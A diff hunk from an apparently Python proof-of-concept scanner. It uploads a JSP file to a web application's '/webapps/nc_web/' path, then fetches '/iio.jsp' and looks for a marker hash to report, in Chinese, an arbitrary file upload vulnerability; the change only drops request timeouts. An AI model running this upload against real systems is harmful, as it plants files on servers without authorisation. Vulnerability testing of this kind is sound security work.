@@ -53,8 +53,8 @@ class poc:
         'fname':(None,'/webapps/nc_web/{}.jsp'.format(filename),'image/jpeg')
     }
         try:
-            result = requests.post(url=url, files=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            req = requests.get("{}://{}/iio.jsp".format(scheme, netloc), headers=self.headers, verify=False, timeout=3, allow_redirects=False, proxies=self.proxies)
+            result = requests.post(url=url, files=data, headers=self.headers, verify=False, proxies=self.proxies)
+            req = requests.get("{}://{}/iio.jsp".format(scheme, netloc), headers=self.headers, verify=False, allow_redirects=False, proxies=self.proxies)
             if req.status_code == 200 and "bea86d66a5278f9e6fa1112d2e2fcebf" in req.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
